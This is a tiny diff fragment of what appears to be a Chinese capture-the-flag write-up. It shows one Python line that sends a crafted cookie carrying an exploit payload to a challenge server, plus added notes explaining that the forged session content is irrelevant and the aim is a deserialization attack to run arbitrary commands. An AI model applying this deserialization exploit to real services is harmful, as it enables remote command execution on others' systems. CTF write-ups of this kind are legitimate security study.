@@ -90,3 +90,5 @@ requests.get('http://gz.imxbt.cn:20458/secret', cookies={'name': exp.decode()})
 
 
 ```
+伪造session发包，这里内容是什么不重要，因为根据源码name=admin也不能得到flag
+我们的目的是打反序列化，执行我们的命令就好了。
